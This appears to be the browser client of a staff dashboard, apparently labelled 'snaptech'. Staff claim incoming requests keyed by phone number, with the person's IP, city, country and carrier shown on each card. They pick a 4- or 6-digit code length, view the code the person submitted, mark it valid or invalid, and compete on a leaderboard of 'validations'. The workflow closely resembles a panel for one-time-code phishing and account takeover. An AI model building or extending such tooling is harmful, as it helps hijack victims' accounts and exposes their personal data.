/**
 * app.js — dashboard client
 *
 * State model: a single Map<phone, requestObject>, kept in sync three ways:
 *   1. Initial GET /api/requests on load.
 *   2. Socket.IO events (request:new / request:update / request:remove) —
 *      pushed by EITHER the Discord bot side or another browser tab's
 *      action, so this tab updates without the user doing anything.
 *   3. Optimistic local update right after this tab's own action succeeds
 *      (the server also broadcasts it back, a harmless no-op re-render).
 *
 * VISIBILITY RULES (client-side filter, not a server-side security
 * boundary — everyone here is already authenticated staff; this is purely
 * about decluttering each person's view):
 *   - Unclaimed: everyone sees every pending request, oldest first. One
 *     older than the configured max age is hidden (still exists, still
 *     claimable from Discord — purely a display filter).
 *   - In Progress / Awaiting Code / Code Submitted: each staff member only
 *     sees requests THEY claimed. Owners get an extra "All Active" view
 *     with every claimed request from everyone.
 *
 * Text: every user-facing string goes through T(key, vars), backed by the
 * JSON dictionary loaded by webi18n.js (site-only language, separate from
 * the Discord message language). T() falls back to the raw key if the
 * dictionary somehow never loaded, which only ever happens if BOTH the
 * chosen language's file AND the English fallback failed to fetch.
 */

const ME = window.__ME__ || { id: null, owner: false, unclaimedMaxAgeMinutes: 20 };
const state = { requests: new Map() };

function $(sel, root = document) { return root.querySelector(sel); }
function $all(sel, root = document) { return [...root.querySelectorAll(sel)]; }
function T(key, vars) { return window.WEBI18N ? window.WEBI18N.t(key, vars) : key; }

// ─── Toasts ─────────────────────────────────────────────────────────────────

function showToast(message) {
    const el = document.createElement("div");
    el.className = "toast";
    el.textContent = message;
    $("#toasts").appendChild(el);
    setTimeout(() => el.remove(), 6000);
}

// ─── View switching (sidebar categories) ───────────────────────────────────────

const VIEW_TITLE_KEYS = {
    pending:     "title_unclaimed",
    active:      "title_inprogress",
    waiting:     "title_awaiting",
    submitted:   "title_submitted",
    all:         "title_all",
    leaderboard: "title_leaderboard",
};

function switchView(view) {
    $all(".nav-item[data-view]").forEach(b => b.classList.toggle("active", b.dataset.view === view));
    $all(".view[data-view-panel]").forEach(p => p.classList.toggle("active", p.dataset.viewPanel === view));
    const title = $("#view-title");
    if (title) title.textContent = T(VIEW_TITLE_KEYS[view] || view);
    localStorage.setItem("snaptech-dashboard-view", view);
}

$all(".nav-item[data-view]").forEach(btn => {
    btn.addEventListener("click", () => switchView(btn.dataset.view));
});

// ─── Data layer ───────────────────────────────────────────────────────────────

function mergeRequest(partial) {
    const existing = state.requests.get(partial.phone) || { phone: partial.phone };
    for (const k of Object.keys(partial)) {
        if (partial[k] !== undefined) existing[k] = partial[k];
    }
    state.requests.set(partial.phone, existing);
}

async function loadRequests() {
    const res = await fetch("/api/requests");
    if (!res.ok) { showToast(T("toast_load_failed")); return; }
    const rows = await res.json();
    state.requests.clear();
    for (const row of rows) state.requests.set(row.phone, row);
    render();
}

async function loadLeaderboard() {
    const res = await fetch("/api/leaderboard");
    if (!res.ok) return;
    const rows = await res.json();
    const list = $("#leaderboard");
    list.innerHTML = rows.length
        ? rows.map((r, i) => `<li><span><span class="rank">#${i + 1}</span>${escapeHtml(r.staff || "?")}</span><span class="count">${r.validations}</span></li>`).join("")
        : `<li class="empty">—</li>`;
}

// ─── Actions ──────────────────────────────────────────────────────────────────

async function callAction(path, body) {
    const res = await fetch(path, {
        method: "POST",
        headers: body ? { "Content-Type": "application/json" } : undefined,
        body: body ? JSON.stringify(body) : undefined,
    });
    let data = {};
    try { data = await res.json(); } catch { /* no body */ }
    if (!res.ok || data.success === false) {
        showToast(data.message || T("toast_action_failed", { status: res.status }));
        return false;
    }
    return true;
}

const actions = {
    claim:     (phone) => callAction(`/api/requests/${phone}/claim`),
    len4:      (phone) => callAction(`/api/requests/${phone}/length`, { length: 4 }),
    len6:      (phone) => callAction(`/api/requests/${phone}/length`, { length: 6 }),
    wrong:     (phone) => callAction(`/api/requests/${phone}/wrong`),
    unclaim:   (phone) => callAction(`/api/requests/${phone}/unclaim`),
    truecode:  (phone) => callAction(`/api/requests/${phone}/truecode`),
    falsecode: (phone) => callAction(`/api/requests/${phone}/falsecode`),
};

// ─── Rendering ──────────────────────────────────────────────────────────────────

function escapeHtml(s) {
    return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

const STATUS_KEY = {
    pending:        "status_pending",
    processing:     "status_processing",
    retry_code:     "status_processing",
    waiting_code:   "status_waiting_code",
    code_submitted: "status_code_submitted",
};

function claimerHtml(row) {
    if (!row.claimedByDiscordId) return "";
    const mine = row.claimedByDiscordId === ME.id;
    return `<div class="claimer">${mine ? T("claimed_by_you") : T("claimed_by", { user: escapeHtml(row.claimedByDiscordId) })}</div>`;
}

function actionsHtml(row, { readOnly = false } = {}) {
    if (readOnly) return claimerHtml(row) || `<div class="claimer">${escapeHtml(T("status_pending"))}</div>`;
    switch (row.status) {
        case "pending":
            return `<button class="btn btn-primary" data-action="claim">${T("btn_claim")}</button>`;
        case "processing":
        case "retry_code":
            return `
                <button class="btn btn-success" data-action="len4">${T("btn_4digits")}</button>
                <button class="btn btn-success" data-action="len6">${T("btn_6digits")}</button>
                <button class="btn btn-danger" data-action="wrong">${T("btn_wrong")}</button>
                <button class="btn btn-secondary" data-action="unclaim">${T("btn_unclaim")}</button>
            `;
        case "waiting_code":
            return `<div class="claimer">${T("waiting_for_code", { length: row.codeLength || "?" })}</div>`;
        case "code_submitted":
            return `
                <div class="code-display">${escapeHtml((row.staffCode || "").split("").join(" "))}</div>
                <button class="btn btn-success" data-action="truecode">${T("btn_validate")}</button>
                <button class="btn btn-danger" data-action="falsecode">${T("btn_reject")}</button>
            `;
        default:
            return "";
    }
}

function metaField(labelKey, value) {
    return `<div><span class="k">${T(labelKey)}</span><span class="v">${escapeHtml(value)}</span></div>`;
}

function cardHtml(row, opts) {
    return `
        <div class="card" data-phone="${escapeHtml(row.phone)}" data-status="${escapeHtml(row.status)}">
            <div class="top">
                <div>
                    <div class="username">${escapeHtml(row.username || "—")}</div>
                    <div class="subline">${escapeHtml(row.phone)} · ${escapeHtml(row.operator || "?")}</div>
                </div>
                <span class="status status-${row.status}">${T(STATUS_KEY[row.status] || row.status)}</span>
            </div>
            <div class="meta">
                ${metaField("meta_country", row.country || "?")}
                ${metaField("meta_city", row.city || "?")}
                ${metaField("meta_ip", row.ip || "?")}
                ${metaField("meta_time", row.createdAt ? new Date(row.createdAt).toLocaleTimeString() : "?")}
            </div>
            <div class="footer">
                ${!opts?.readOnly ? claimerHtml(row) : ""}
                <div class="actions">${actionsHtml(row, opts)}</div>
            </div>
        </div>
    `;
}

function isStaleUnclaimed(row) {
    if (!row.createdAt) return false;
    const ageMs = Date.now() - new Date(row.createdAt).getTime();
    return ageMs > (ME.unclaimedMaxAgeMinutes || 20) * 60_000;
}

function render() {
    const buckets = { pending: [], active: [], waiting: [], submitted: [], all: [] };
    for (const row of state.requests.values()) {
        if (row.status === "pending") {
            if (!isStaleUnclaimed(row)) buckets.pending.push(row);
            continue;
        }
        const mine = row.claimedByDiscordId === ME.id;
        if (row.status === "processing" || row.status === "retry_code") {
            if (mine) buckets.active.push(row);
        } else if (row.status === "waiting_code") {
            if (mine) buckets.waiting.push(row);
        } else if (row.status === "code_submitted") {
            if (mine) buckets.submitted.push(row);
        }
        if (ME.owner && row.status !== "pending") buckets.all.push(row);
    }
    const byAge = (a, b) => new Date(a.createdAt || 0) - new Date(b.createdAt || 0);
    for (const k of Object.keys(buckets)) buckets[k].sort(byAge);

    renderColumn("#col-pending",   buckets.pending);
    renderColumn("#col-active",    buckets.active);
    renderColumn("#col-waiting",   buckets.waiting);
    renderColumn("#col-submitted", buckets.submitted);
    if (ME.owner) renderColumn("#col-all", buckets.all, { readOnly: true });

    setCount("#count-pending",   buckets.pending.length);
    setCount("#count-active",    buckets.active.length);
    setCount("#count-waiting",   buckets.waiting.length);
    setCount("#count-submitted", buckets.submitted.length);
    if (ME.owner) setCount("#count-all", buckets.all.length);
}

function setCount(sel, n) {
    const el = $(sel);
    if (el) el.textContent = n;
}

function renderColumn(sel, rows, opts) {
    const el = $(sel);
    if (!el) return;
    el.innerHTML = rows.length ? rows.map(r => cardHtml(r, opts)).join("") : `<div class="empty">${T("empty_state")}</div>`;
}

// Delegated click handler — cards are re-rendered wholesale, so listeners are attached once on the container.
document.addEventListener("click", async (e) => {
    const btn = e.target.closest("button[data-action]");
    if (!btn) return;
    const card = btn.closest(".card");
    const phone = card?.dataset.phone;
    const actionName = btn.dataset.action;
    if (!phone || !actions[actionName]) return;

    btn.disabled = true;
    const ok = await actions[actionName](phone);
    if (!ok) btn.disabled = false;
});

// ─── Socket.IO ──────────────────────────────────────────────────────────────────

function connectSocket() {
    const socket = io();
    const status = $("#conn");
    socket.on("connect", () => { status.textContent = T("conn_live"); status.style.color = "var(--green)"; });
    socket.on("disconnect", () => { status.textContent = T("conn_reconnecting"); status.style.color = "var(--red)"; });

    socket.on("request:new", (row) => { state.requests.set(row.phone, row); render(); });
    socket.on("request:update", (partial) => { mergeRequest(partial); render(); });
    socket.on("request:remove", ({ phone }) => { state.requests.delete(phone); render(); });
}

// ─── Boot ──────────────────────────────────────────────────────────────────────

(async function boot() {
    await window.WEBI18N_READY;

    const hint = $("#hint-pending");
    if (hint) hint.textContent = T("hint_unclaimed", { minutes: ME.unclaimedMaxAgeMinutes || 20 });

    switchView(localStorage.getItem("snaptech-dashboard-view") || "pending");

    await loadRequests();
    loadLeaderboard();
    connectSocket();
    setInterval(loadLeaderboard, 60_000);
    // Safety-net full refresh every 30s in case a socket event was ever missed —
    // this also re-evaluates the "too old to show" cutoff for unclaimed cards.
    setInterval(loadRequests, 30_000);
})();
